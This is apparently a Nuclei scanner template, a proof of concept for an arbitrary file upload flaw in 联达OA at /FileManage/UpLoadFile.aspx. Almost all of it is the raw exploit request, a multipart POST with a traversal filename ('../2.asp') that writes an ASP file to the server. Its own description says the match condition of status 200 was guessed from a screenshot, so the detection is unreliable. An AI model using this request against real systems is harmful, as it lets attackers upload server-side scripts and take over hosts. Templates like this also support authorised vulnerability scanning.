id: poc-fatgvmrbg9xtd1ae
info:
  name: 联达OA FileManage-UpLoadFile存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /FileManage/UpLoadFile.aspx HTTP/1.1

    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36

    Content-Type: multipart/form-data; boundary=00content0boundary00

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 241

    Connection: close

    --00content0boundary00

    Content-Disposition: form-data; name="DesignId"

    1

    --00content0boundary00

    Content-Disposition: form-data; name="file"; filename="../2.asp"

    Content-Type: image/png

    123

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
